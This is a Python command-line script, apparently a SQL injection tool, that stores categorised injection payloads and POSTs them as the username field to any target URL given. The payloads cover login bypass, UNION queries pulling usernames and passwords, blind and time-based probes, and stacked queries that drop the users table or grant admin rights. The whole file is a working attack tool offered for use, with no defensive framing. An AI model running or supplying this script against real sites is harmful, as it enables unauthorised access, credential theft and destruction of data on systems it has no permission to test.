import random
import argparse
import requests

# --- PAYLOAD CATEGORIES ---
payloads = {
    "auth_bypass": [
        "' OR '1'='1' --",
        "' OR 1=1 #",
        "admin' -- ",
        "' OR TRUE --"
    ],
    "union": [
        "' UNION SELECT null, null, version() --",
        "' UNION SELECT username, password FROM users --",
        "' UNION SELECT 1, 2, database() --"
    ],
    "error": [
        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)a)--"
    ],
    "blind_bool": [
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND SUBSTRING(@@version,1,1)='5' --"
    ],
    "time_based": [
        "' OR IF(1=1, SLEEP(5), 0) --",
        "' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(3), 0) --",
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END --"
    ],
    "stacked_queries": [
        "'; DROP TABLE users; --",
        "'; UPDATE users SET admin=1 WHERE username='guest'; --"
    ],
}

# --- PAYLOAD INJECTION ---
def payload_injector(uri, payload):
    data = {
        "username": payload,
        "password": "test"
    }
    try:
        response = requests.post(uri, json=data)
        print(f"[{response.status_code}] => Sent payload: {payload}")
    except Exception as e:
        print(f"[!] Error sending payload: {e}")

# --- ARGUMENT PARSER ---
parser = argparse.ArgumentParser(description="SQLi Payload Generator and Injector")
parser.add_argument("-c", "--category", choices=payloads.keys(), help="Payload category")
parser.add_argument("-r", "--random", action="store_true", help="Get a random payload from all categories")
parser.add_argument("-u", "--uri", help="Target URL to inject payload into")
args = parser.parse_args()

# --- MAIN LOGIC ---
if args.uri:
    if args.random:
        all_payloads = [p for cat in payloads.values() for p in cat]
        selected = random.choice(all_payloads)
        payload_injector(args.uri, selected)
    elif args.category:
        for p in payloads[args.category]:
            payload_injector(args.uri, p)
    else:
        print("[!] Please provide either --category or --random with --uri")
else:
    if args.random:
        all_payloads = [p for cat in payloads.values() for p in cat]
        print(random.choice(all_payloads))
    elif args.category:
        for p in payloads[args.category]:
            print(p)
    else:
        parser.print_help()
